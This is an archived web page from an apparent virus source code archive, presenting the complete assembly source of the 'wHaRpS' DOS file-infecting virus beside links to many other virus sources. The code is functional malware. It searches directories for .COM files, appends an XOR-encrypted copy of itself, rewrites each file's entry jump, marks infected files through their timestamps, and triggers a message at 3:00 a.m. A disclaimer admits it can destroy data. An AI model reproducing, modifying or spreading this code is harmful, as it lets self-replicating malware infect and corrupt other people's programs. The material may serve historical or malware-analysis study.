<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: wharps_asm</title>
<meta name="KEYWORDS" content="wharps.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for wharps.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="w13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_507_asm.php">w13_507_asm</a><br>
<a href="w13_534__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534__asm.php">w13_534__asm</a><br>
<a href="w13_534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_534_asm.php">w13_534_asm</a><br>
<a href="w13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/w13_asm.php">w13_asm</a><br>
<a href="walkabr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/walkabr_asm.php">walkabr_asm</a><br>
<a href="wanderer_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wanderer_asm.php">wanderer_asm</a><br>
<a href="warzd00d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/warzd00d_asm.php">warzd00d_asm</a><br>
<a href="whale1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale1_asm.php">whale1_asm</a><br>
<a href="whale2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale2_asm.php">whale2_asm</a><br>
<a href="whale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whale_asm.php">whale_asm</a><br>
<a href="wharps_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wharps_asm.php">wharps_asm</a><br>
<a href="whocares_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/whocares_asm.php">whocares_asm</a><br>
<a href="why_win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why_win_asm.php">why_win_asm</a><br>
<a href="why-win_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/why-win_asm.php">why-win_asm</a><br>
<a href="wildthg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthg2_asm.php">wildthg2_asm</a><br>
<a href="wildthng_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wildthng_asm.php">wildthng_asm</a><br>
<a href="wonder_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wonder_c.php">wonder_c</a><br>
<a href="wvir14a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14a_asm.php">wvir14a_asm</a><br>
<a href="wvir14_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wvir14_asm.php">wvir14_asm</a><br>
<a href="ww_217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww_217_asm.php">ww_217_asm</a><br>
<a href="ww-217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww-217_asm.php">ww-217_asm</a><br>
<a href="ww217_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/ww217_asm.php">ww217_asm</a><br>
<a href="wwt_01_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_01_asm.php">wwt_01_asm</a><br>
<a href="wwt_02_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/wwt_02_asm.php">wwt_02_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; "One must crawl before one walks." 
;                              wHaRpS Virus 1.0
; wHaRpS virus of independent virus writer FirstStrike
; For use by [Phalcon\Skism] ONLY!
; Special thanx to:
;               Gheap
;               Dark Angel
;               Demogorgon


name    wHaRpS
        title   
code    segment
        assume  cs:code,ds:code
        org     100h


dta     equ     65000d                  ; DTA address to be set
fname   equ     65000d + 1eh            ; DTA - file name      
ftime   equ     65000d + 16h            ; DTA - file time      
fsize   equ     65000d + 1ah            ; DTA - file size      
orgdir  equ     65400d                  ; original path storage
date    equ     65300d                  ; store file date
time    equ     65302d                  ; store file time
attrib  equ     65304d                  ; store file attrib
err1    equ     65306d                  ; old error handler address
err2    equ     65308d                  ; old error handler address

olddta  equ     80h                     ; original DTA address      

        

begin:
        nop
        nop
        nop
        call    setup                   ; find "delta offset"
setup:               
        pop     bp                              
        sub     bp, offset setup
        jmp     main                    ; DEBUG E8 02 00
        nop
        jmp     main

crypt_em:  
        xor        di,di
        lea        si, [bp+main]      
        mov        di, si
        mov        cx, end_crypt - main

xor_loop:
        lodsb                           ; ds:[si] -> al
        db      34h                     ; xor al, XX
encrypt_val db 0                        ; Starting encryption value is 0
        stosb                           ; al ->es:[di]
        loop    xor_loop
        ret

main:
        xor     di,di
        mov     di,0100h                ; Restore first three      
        lea     si,[bp+saveins]         ;  original program bytes
        mov     cx,0003d
        rep     movsb
        jmp     system_pic              ; Take a "picture" of system settings

handler:                                ; error handler
        mov     al,0
        iret
endp


data    label   byte
wharps    db    '[wHaRpS]',0            ; wHaRpS ID
author    db    'FŒrsØStrŒkä',0         ; Me
dir_mask  db    '*.',0                  ; dir atrib
allcom    db    '*.COM',0               ; what to search for
root      db    '\',0                   ; root
saveins   db    0e8h,00h,00h            ; original three bytes
ultimate  dw    0                       ; ultimate dir to be reached
current   dw    0                       ; current dir
message   db    'wHaRpS! It is 3:00 a.m. > ETERNAL $'

system_pic:                             ; SNAP!
        mov     ah,47h                  ; get original path
        mov     dl,0
        lea     si,cs:orgdir            ; store original path
        int     21h

crypt_change:                           ; set crypt value
        mov     ah,2ch
        int     21h
        mov     [bp+encrypt_val],dl
        cmp     ch,03
        jz      more
        jmp     errorh

more:
        cmp     cl,00
        jz      bomb
        jmp     errorh
        
bomb:
        mov     ah,09h
        lea     dx,[bp+message]
        int     21h
        mov     ah,4ch
        int     21h

errorh:                                 
        push    es                      ; save original error handler address
        mov     ax,3524h                      
        int     21h                           
        mov     word ptr cs:err1,bx
        mov     word ptr cs:err2,es
        pop     es                            

        mov     ax,2524h                ; set an error handler       
        lea     dx, [bp+offset handler] ;  no more Retry,Abort,Fail deals            
        int     21h
        jmp     pre_search

drop_to_root:                           ; subroutine to visit the root
        lea     dx,[bp+root]
        jmp     continue

set_path:                               ; OR set a path
        lea     dx,cs:fname
        
continue:
        mov     ah,3bh
        int     21h
        ret
       
return_to_search:
        inc     [bp+ultimate]           
        call    drop_to_root
        mov     [bp+current],0000
        jmp     find_first_dir


pre_search:                             ; set a DTA
        mov     dx,dta
        mov     ah,1ah
        int     21h
        
        mov     [bp+current],0000       ; zero the counters
        mov     [bp+ultimate],0000      ; ""
        inc     [bp+ultimate]           ; want to search 1st dir in root
        call    drop_to_root            ; bomb to root

find_first_dir:                         ; directory searchin'
        lea     dx,[bp+dir_mask]              
        mov     cx,16
        mov     ah,4Eh                       
        int     21h
        jc      almost_done             ; no directories?        
        
dir_test:
        inc     [bp+current]            ; directory found - MARK!
        mov     bx,[bp+current]         
        cmp     word ptr [bp+ultimate],bx ; is it the one we want?
        jnz     find_next_dir           ; no, find another
        call    set_path                ; yes, set the correct path
        jmp     find_first_file         ; find some .COMs



find_next_dir:                          ; mo' directory searchin'
        mov     ah,4fh                         
        int     21h
        jc      almost_done
        jmp     dir_test                ; go see if correct dir found yet
     


find_first_file:                        ; file searchin'
        lea     dx,[bp+allcom]              
        mov     cx,00000001b                  
        mov     ah,4Eh                         
        int     21h
        jc      return_to_search        ; no .COM so mo' dir              
        jmp     check_if_ill            ; is the file "sick"?



find_next_file:                         ; keep on a searchin'
        mov     ah,4fh                       
        int     21h
        jc      return_to_search        ; no more .COM so back 
                                        ;  to the directories

check_if_ill:                           ; check file's health
        mov     ax,cs:ftime
        and     al,11111b               ; good, your sick!      
        cmp     al,62d/2                ; (No more 62 seconds as virus       
        jz      find_next_file          ;  markers! - I swear!)

        cmp     cs:fsize,60000d         ; whoa, file to big!    
        ja      find_next_file          ; so, get a new one     

        cmp     cs:fsize,500d           ; whoa, file to small!    
        jb      find_next_file          ; throw it back and move on          
        jmp     infect                  ; perfect, for infection

        db      'Joy J.',0              ; don't ask

error:
pre_done:
almost_done:
        jmp     done                    ; in case of emergency.....

infect:
        mov     ah,43h                  ; save original attribute
        mov     al,00h
        lea     dx,cs:[fname]
        int     21h
        mov     cs:attrib,cx
        jc      pre_done

        mov     ax,4301h                ; clear all attributes       
        and     cx,11111110b            ;  (none shall slow progress)
        int     21h
        jc      pre_done

        
        mov     ax,3d02h                ; open the file, please      
        int     21h
        jc      pre_done
        xchg    bx,ax
        
        

        mov     ax,5700h                ; save the date/time      
        int     21h
        mov     cs:time,cx                  
        mov     cs:date,dx
        jc      pre_done


        mov     ah,3Fh                  ; read first 3 bytes of file 
        mov     cx,0003h                ;  to be infected and save
        lea     dx,[bp+saveins] 
        int     21h
        jc      pre_done        

        mov     ax,4202h                ; move to end of file
        xor     cx,cx           
        xor     dx,dx
        int     21h
        jc      pre_done        
        mov     [bp+new_jmp],ax

        call    crypt_em                 

end_crypt       label     byte          ; encrypt to here

        mov     ah,40h                  
        mov     cx,endcode-begin        
        lea     dx,[bp+begin]           
        int     21h                     ; encrypt n' write virus to end of 
        jc      done                    ;  file

        mov     ax,4200h                ; go to beginning of file
        xor     cx,cx         
        xor     dx,dx
        int     21h
        jc      done
        jmp     cont

jmpc      db    0e9h
new_jmp   dw    ?

cont:
        mov     ah,40h        
        mov     cl,3           
        lea     dx,[bp+jmpc] 
        int     21h
        jc      done

attrib_stuff:                  

        mov     ax,5701h       
        mov     cx,cs:[time]
        mov     dx,cs:[date]
        or      cl,11111b      
        int     21h
        jc      done

        mov     ah,3eh
        int     21h
        jc      done

        mov     ax,4301h
        mov     cx,cs:[attrib]
        lea     dx,cs:[fname]
        int     21h
        jc      done

done:
        mov     dx,olddta               ; restore all changes
        mov     ah,1ah
        int     21h

        push    ds             
        mov     ax,2524h       
        lea     dx,cs:[err2]
        mov     ds,dx
        lea     dx,cs:[err1]
        int     21h
        pop     ds             
        
        mov     ah,3bh
        mov     dx,'/'
        int     21h

        mov     ah,3bh
        lea     dx,cs:[orgdir]
        int     21h

        xor     di,di
        mov     di,0100h                    
        jmp     di                      ; good_bye




endcode         label     byte                              




code      ends
end       begin
  
  

</textarea></td></tr></table></body></html>
